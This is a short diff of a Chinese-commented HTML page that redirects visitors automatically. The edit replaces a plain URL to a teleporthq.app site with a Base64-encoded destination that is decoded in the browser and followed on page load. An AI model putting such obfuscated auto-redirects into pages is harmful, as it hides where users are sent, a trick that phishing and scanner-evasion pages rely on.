@@ -1,17 +1,14 @@
-</html>
 <!DOCTYPE html>
 <html>
-<head>
-	<meta charset="UTF-8">
-	<title>自动跳转页面</title>
-</head>
-<body>
-	<script>
-		var url = 'https://healthy-great-lobster-jdmca2.teleporthq.app/';
-		var urlParts = url.split('/'); // 将URL按照'/'分割成数组
-		var newUrl = 'https://' + urlParts[2] + '/' + urlParts[3] + '/' + urlParts[4]; // 拼接新的URL
-		window.location.href = newUrl; // 自动跳转到新的URL
-	</script>
-</body>
+  <head>
+    <meta charset="UTF-8">
+    <title>跳转页面</title>
+  </head>
+  <body>
+    <script>
+      var url = "aHR0cHM6Ly9taXlhb2luLm5ldGxpZnkuYXBwLw==";
+      var decodedUrl = atob(url); // 对 URL 进行 Base64 解码
+      window.location.href = decodedUrl; // 跳转到解码后的 URL
+    </script>
+  </body>
 </html>
-
